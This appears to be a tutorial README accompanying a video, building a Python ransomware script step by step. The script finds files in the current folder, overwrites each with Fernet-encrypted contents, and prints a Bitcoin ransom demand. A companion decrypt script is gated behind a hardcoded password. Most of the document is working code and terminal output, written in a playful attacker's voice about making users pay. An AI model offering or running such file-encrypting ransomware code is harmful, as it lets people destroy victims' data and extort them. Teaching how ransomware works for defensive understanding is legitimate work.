# Ransomware

This is an example application featured in NetworkChuck's <a href="https://youtu.be/UtMMjXOlRQc">Python Malware Tutorial</a>.

### Instructions

**Step 1:**
Make a folder called ``ransomware`` and create a few random ``.txt`` files with some silly phrases in them:

<pre>
<code>$ mkdir ransomware
$ cd ransomware
$ echo "This is a file" > file.txt
$ echo "Leave me alone" > file2.txt
$ echo "Another one" > hey.txt
$ echo "One more time" > pleasedonthurtme.txt</code>
</pre>

Now let's hold these files for ransom! Let's encrypt those suckers right now! Here we go:

<pre>
<code>$ nano voldemort.py</code>
</pre>

Write this code in the following ``voldemort.py`` file:

<details>
<summary>💰 How to Hold These Files for Ransom:</summary>

```python
#!/usr/bin/env python3
import os

# Let's find some files!
files = []

for file in os.listdir():
    if file == "voldemort.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

```
</details>

When you first run ``voldemort.py`` in your terminal, you should see the following output:

<pre>
<code>$ python voldemort.py
['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']</code>
</pre>

**Step 2:**
Now let's encrypt those files! Start it off by running the following command:

<pre>
<code>$ nano voldemort.py</code>
</pre>

Add more code to ``voldemort.py``:

<details>
<summary>🔒 How to Encrypt These Files:</summary>

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# Let's find some files!
files = []

for file in os.listdir():
    if file == "voldemort.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

print(key)

```
</details>

When you next run ``voldemort.py``, you should see the following output for your key:

<pre>
<code>$ python voldemort.py
['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']
b'8QVEe4MBoSLINxTpyOExsqrL5XiOks5g1_w-xF-OAmk='</code>
</pre>

**Step 3:**
Obviously, we don't want to print our key right out there in the open where the user can see it. We want the user to give us money, but we do need to save the key into another file for safety so we can unlock the files later *after* we get paid 😉:

<pre>
<code>$ nano voldemort.py</code>
</pre>

Add more code to ``voldemort.py``:

<details>
<summary>🔑 How to Save the Key:</summary>

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# Let's find some files!
files = []

for file in os.listdir():
    if file == "voldemort.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

```
</details>

Run ``voldemort.py`` and you should see the following output:

<pre>
<code>$ python voldemort.py
['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']</code>
</pre>

Wait, where is ``thekey.key``? Don't worry! It is still hidden and we can finally view it by entering the following commands:

<pre>
<code>$ ls
file.txt             hey.txt              thekey.key
file2.txt            pleasedonthurtme.txt voldemort.py
$ cat thekey.key
se_by38p9NVVsWezjKWbKgdztEl1GhHZsbMwcGqei84=%</code>
</pre>

**Step 4:**
Now this is where things start to get interesting. We will be pushing our ``thekey.key`` file into the code for our ``voldemort.py`` file so that all the other files will be encrypted. In other words, the poor user can now only see those files as gibberish:

<pre>
<code>$ nano voldemort.py</code>
</pre>

Add the following code to ``voldemort.py``:

<details>
<summary>👁️👄👁️ How to Make These Files Come Out as Garble:</summary>

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# Let's find some files!
files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print(
    "UH OH!! All of your files have been encrypted! Send me 100 Bitcoin "
    "or they will be gone in 24 hours FOREVER!!! ☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️"
)

```
</details>

Make one quick goodbye to each ``.txt`` file before they get encrypted by your mom:

<pre>
<code>$ cat file.txt
This is a file
$ cat file2.txt
Leave me alone
$ cat hey.txt
Another one
$ cat pleasedonthurtme.txt
One more time</code>
</pre>

Run ``voldemort.py`` and you should see the following output:

<pre>
<code>$ python voldemort.py
['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']
UH OH!! All of your files have been encrypted! Send me 100 Bitcoin or they will be gone in 24 hours FOREVER!!! ☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️</code>
</pre>

This is the moment we've all been waiting for. Now all these ``.txt`` files have been left in ruins 😈:

<pre>
<code>$ cat file.txt
gAAAAABo-Awg21o-xvSxpDgNGSmIIp7-dnngyWuPg7LrHrk3natLfkXeQ6tmOUmFEEjF7Y2RiGlSA4qUAzCUuENsnPWvMN9M_A==%
$ cat file2.txt
gAAAAABo-Awg7t0A_gnTwpl0wWT8wQ5n_H_8bMYAUkNSaF3matNYFsdLnL5Va1oHzkPf1er3fPCKdENvHEdgdfbz_ezx6MiHcg==%
$ cat hey.txt
gAAAAABo-AwgVjmPsRVbL8dOGVu3vb6irWteZ-hFoJmatlHmUo7OzaKfLYS8sWJJcbEOG8YZWkhopMEjDenfYsDGxUti3BJVVw==%
$ cat pleasedonthurtme.txt
gAAAAABo-AwgPUfd7gp184nZvENjB9NhHBiXUZkbrUV4FKnBJZbCQg1fDEll2U42eUYLCBE0LOavmW7fnLFB5Rt8btzK5LspBw==%</code>
</pre>

Fortunately for us hackers, we have a new ``thekey.key`` and that is the key to unlocking these files:

<pre>
<code>$ cat thekey.key
SUxaxvZHjB7l5wgJJJFrHyWHr0D3WBA8CdYWYHVnrIc=%</code>
</pre>

**Step 5:**
Now we can unlock all these files once and for all by writing a ``decrypt.py`` file. Luckily, it is already very similar to the ``voldemort.py`` (AKA the *encrypt.py* file):

<pre>
<code>$ cp voldemort.py decrypt.py
$ nano decrypt.py</code>
</pre>

Add the following code to the ``decrypt.py`` file:

<details>
<summary>🔑 How to Decrypt the Files:</summary>

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# Let's find some files!
files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secret_key = key.read()

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_decrypted = Fernet(secret_key).decrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_decrypted)

```
</details>

Run ``decrypt.py`` and you should see the following output:

<pre>
<code>$ python decrypt.py
['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']</code>
</pre>

Now you can see that all of the files have finally been decrypted!!!

<pre>
<code>$ cat file.txt
This is a file
$ cat file2.txt
Leave me alone
$ cat hey.txt
Another one
$ cat pleasedonthurtme.txt
One more time</code>
</pre>

**Step 6:**
Let's add a bit of fun to our ``decrypt.py`` file:

<pre>
<code>$ nano decrypt.py</code>
</pre>

Add the following code to the ``decrypt.py`` file:

<details>
<summary>🔑 How to Password-Lock the Encrypted Files:</summary>

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# Let's find some files!
files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secret_key = key.read()

secret_phrase = "coffee"

user_phrase = input(
    "Enter the secret password to decrypt "
    "all of your files:\n ")

if user_phrase == secret_phrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secret_key).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
        print(
            "Congratulations! All of your files have been decrypted. "
            "Enjoy your coffee ️❤ ☕ ❤"
        )
else:
    print(
        "Sorry not sorry, but you entered da wong secret password. "
        "Send me more Bitcoin! 🤑🤑🤑"
    )

```
</details>

Run ``voldemort.py`` *again* and you should see the following output:

<pre>
<code>$ python voldemort.py
['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']
UH OH!! All of your files have been encrypted! Send me 100 Bitcoin or they will be gone in 24 hours FOREVER!!! ☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️</code>
</pre>

Then run ``decrypt.py`` *again* and you should see the following output:

<pre>
<code>$ python decrypt.py
['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']</code>
</pre>

Now you can see that all of the files have finally been decrypted!!!
